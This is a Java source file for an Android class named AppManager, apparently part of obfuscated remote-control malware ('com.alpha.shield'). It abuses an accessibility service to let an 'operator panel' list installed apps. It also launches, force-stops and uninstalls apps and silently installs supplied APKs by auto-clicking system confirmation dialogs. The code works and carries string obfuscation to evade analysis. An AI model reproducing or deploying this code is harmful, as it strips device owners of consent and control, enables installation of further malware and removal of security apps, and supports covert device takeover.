package com.alpha.shield;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.core.content.FileProvider;

import org.json.JSONArray;
import org.json.JSONObject;
import org.lsposed.lsparanoid.Obfuscate;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * AppManager — Alpha.
 *
 * LIST: Installed apps with label, packageName, versionName, system flag, and
 *       base64-encoded 48×48 PNG icon. Runs on background executor; icons are
 *       batched (50 at a time) so the initial list delivers fast with icons filling in.
 *
 * LAUNCH: Finds and fires the launcher intent for any package.
 *
 * FORCE STOP: Primary path — accessibility automation through Settings › Apps.
 *             Fallback — ActivityManager.killBackgroundProcesses (needs permission
 *             granted by device admin or shell, often available to priv-apps).
 *
 * UNINSTALL: Fires ACTION_DELETE; operator panel sees accessibility confirmation
 *            and auto-clicks it via GestureCore.
 *
 * INSTALL: Writes APK bytes to cache dir, fires ACTION_VIEW with FileProvider URI,
 *          then auto-clicks "Install" and "Open" via accessibility automation.
 */
@Obfuscate
public class AppManager {

    private static final String TAG   = "AppMgr";
    private static final int    ICON_SIZE_PX = 48;

    public interface Callback {
        void onAppList(String json);
        void onResult(String cmd, String pkg, boolean success, String msg);
    }

    private final AccessibilityService service;
    private final GestureCore          gestures;
    private final Callback             callback;
    private final ExecutorService      exec = Executors.newSingleThreadExecutor();
    private final Handler              main = new Handler(Looper.getMainLooper());

    public AppManager(AccessibilityService service,
                      GestureCore gestures,
                      Callback callback) {
        this.service   = service;
        this.gestures  = gestures;
        this.callback  = callback;
    }

    // ── LIST ─────────────────────────────────────────────────────────────────

    /** Fetches installed apps list. Calls callback.onAppList() with JSON. */
    public void listApps(boolean includeSystem, boolean includeIcons) {
        exec.submit(() -> {
            try {
                PackageManager pm = service.getPackageManager();
                List<PackageInfo> packages = pm.getInstalledPackages(0);

                JSONArray arr = new JSONArray();
                List<PackageInfo> filtered = new ArrayList<>();
                for (PackageInfo pi : packages) {
                    boolean isSystem = (pi.applicationInfo.flags
                            & ApplicationInfo.FLAG_SYSTEM) != 0;
                    if (!includeSystem && isSystem) continue;
                    filtered.add(pi);
                }

                // Sort: user apps first, then system, alphabetical within each group
                Collections.sort(filtered, (a, b) -> {
                    boolean aUser = (a.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0;
                    boolean bUser = (b.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0;
                    if (aUser != bUser) return aUser ? -1 : 1;
                    String la = a.applicationInfo.loadLabel(pm).toString();
                    String lb = b.applicationInfo.loadLabel(pm).toString();
                    return la.compareToIgnoreCase(lb);
                });

                for (PackageInfo pi : filtered) {
                    JSONObject obj = new JSONObject();
                    String label = pi.applicationInfo.loadLabel(pm).toString();
                    obj.put("label",   label);
                    obj.put("pkg",     pi.packageName);
                    obj.put("version", pi.versionName != null ? pi.versionName : "");
                    obj.put("system",  (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);

                    if (includeIcons) {
                        try {
                            Drawable icon = pm.getApplicationIcon(pi.packageName);
                            obj.put("icon", drawableToBase64(icon));
                        } catch (Exception e) {
                            obj.put("icon", "");
                        }
                    }
                    arr.put(obj);
                }

                JSONObject root = new JSONObject();
                root.put("apps",  arr);
                root.put("count", arr.length());
                callback.onAppList(root.toString());
            } catch (Exception e) {
                Log.e(TAG, "listApps: " + e.getMessage());
            }
        });
    }

    // ── LAUNCH ───────────────────────────────────────────────────────────────

    public void launchApp(String pkg) {
        try {
            Intent intent = service.getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent == null) {
                callback.onResult("LAUNCH", pkg, false, "no launcher intent");
                return;
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
            service.startActivity(intent);
            callback.onResult("LAUNCH", pkg, true, "launched");
        } catch (Exception e) {
            callback.onResult("LAUNCH", pkg, false, e.getMessage());
        }
    }

    // ── FORCE STOP ────────────────────────────────────────────────────────────

    /**
     * Force-stops a package via Settings accessibility automation.
     * Navigates Settings › Apps › [package] › Force Stop › OK.
     */
    public void forceStop(String pkg) {
        exec.submit(() -> {
            try {
                // Try ActivityManager.killBackgroundProcesses first (fast path)
                android.app.ActivityManager am = (android.app.ActivityManager)
                        service.getSystemService(Context.ACTIVITY_SERVICE);
                if (am != null) {
                    am.killBackgroundProcesses(pkg);
                    // May or may not work depending on permissions; always also try Settings path
                }

                // Settings accessibility path — navigate to App info
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(intent);

                // Wait for Settings to load, then find and click Force Stop
                Thread.sleep(1500);
                boolean clicked = clickNodeWithText("Force stop", "Force Stop");
                if (!clicked) {
                    callback.onResult("FORCE_STOP", pkg, false, "button not found");
                    return;
                }
                // Confirm dialog
                Thread.sleep(500);
                clickNodeWithText("OK", "Ok");
                Thread.sleep(400);

                // Press back to leave Settings
                gestures.back();
                callback.onResult("FORCE_STOP", pkg, true, "stopped");
            } catch (Exception e) {
                callback.onResult("FORCE_STOP", pkg, false, e.getMessage());
            }
        });
    }

    // ── UNINSTALL ─────────────────────────────────────────────────────────────

    /**
     * Uninstalls via ACTION_DELETE. Automation clicks "OK" on the system confirmation.
     */
    public void uninstall(String pkg) {
        exec.submit(() -> {
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE,
                        Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(intent);

                // Wait for system uninstall dialog
                Thread.sleep(1500);
                boolean clicked = clickNodeWithText("OK", "Uninstall", "Delete");
                if (!clicked) {
                    // Try again after a bit more delay (slower devices)
                    Thread.sleep(1000);
                    clicked = clickNodeWithText("OK", "Uninstall", "Delete");
                }
                callback.onResult("UNINSTALL", pkg, clicked,
                        clicked ? "uninstall confirmed" : "confirm dialog not found");
            } catch (Exception e) {
                callback.onResult("UNINSTALL", pkg, false, e.getMessage());
            }
        });
    }

    // ── INSTALL ───────────────────────────────────────────────────────────────

    /**
     * Installs an APK from raw bytes.
     * Writes to getCacheDir(), fires ACTION_VIEW, auto-clicks Install.
     */
    public void installApk(byte[] apkBytes, String filename) {
        exec.submit(() -> {
            File apkFile = null;
            try {
                File cacheDir = service.getCacheDir();
                apkFile = new File(cacheDir, filename.endsWith(".apk") ? filename : filename + ".apk");
                try (FileOutputStream fos = new FileOutputStream(apkFile)) {
                    fos.write(apkBytes);
                }

                Uri apkUri;
                Intent intent = new Intent(Intent.ACTION_VIEW);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    apkUri = FileProvider.getUriForFile(service,
                            service.getPackageName() + ".provider", apkFile);
                    intent.setDataAndType(apkUri,
                            "application/vnd.android.package-archive");
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                } else {
                    apkUri = Uri.fromFile(apkFile);
                    intent.setDataAndType(apkUri,
                            "application/vnd.android.package-archive");
                }
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(intent);

                // Wait for install dialog
                Thread.sleep(2000);
                boolean clicked = clickNodeWithText("Install", "INSTALL");
                if (!clicked) {
                    Thread.sleep(1000);
                    clicked = clickNodeWithText("Install", "INSTALL");
                }
                // Auto-click "Open" or "Done" after install
                if (clicked) {
                    Thread.sleep(3000);
                    clickNodeWithText("Open", "OPEN", "Done", "DONE");
                }
                callback.onResult("INSTALL", filename, clicked,
                        clicked ? "install triggered" : "install button not found");
            } catch (Exception e) {
                callback.onResult("INSTALL", filename, false, e.getMessage());
            } finally {
                if (apkFile != null) apkFile.delete();
            }
        });
    }

    // ── Accessibility automation helper ───────────────────────────────────────

    /**
     * Finds and clicks a node whose text or description matches any of the given labels.
     * Returns true if a node was found and click was dispatched.
     */
    private boolean clickNodeWithText(String... labels) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return false;
        try {
            for (String label : labels) {
                List<AccessibilityNodeInfo> nodes =
                        root.findAccessibilityNodeInfosByText(label);
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isEnabled() && (node.isClickable() || isClickableParent(node))) {
                        AccessibilityNodeInfo clickTarget = node.isClickable()
                                ? node : findClickableParent(node);
                        if (clickTarget != null) {
                            clickTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            node.recycle();
                            if (clickTarget != node) clickTarget.recycle();
                            return true;
                        }
                    }
                    node.recycle();
                }
            }
        } finally {
            root.recycle();
        }
        return false;
    }

    private boolean isClickableParent(AccessibilityNodeInfo node) {
        return findClickableParent(node) != null;
    }

    private AccessibilityNodeInfo findClickableParent(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo parent = node.getParent();
        int depth = 0;
        while (parent != null && depth < 5) {
            if (parent.isClickable()) return parent;
            AccessibilityNodeInfo next = parent.getParent();
            parent.recycle();
            parent = next;
            depth++;
        }
        return null;
    }

    // ── Icon encoding ─────────────────────────────────────────────────────────

    private String drawableToBase64(Drawable drawable) {
        try {
            Bitmap bmp;
            if (drawable instanceof BitmapDrawable) {
                bmp = ((BitmapDrawable) drawable).getBitmap();
            } else {
                bmp = Bitmap.createBitmap(ICON_SIZE_PX, ICON_SIZE_PX, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bmp);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }
            Bitmap scaled = Bitmap.createScaledBitmap(bmp, ICON_SIZE_PX, ICON_SIZE_PX, true);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            scaled.compress(Bitmap.CompressFormat.PNG, 100, baos);
            if (scaled != bmp) scaled.recycle();
            return "data:image/png;base64,"
                    + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }
}
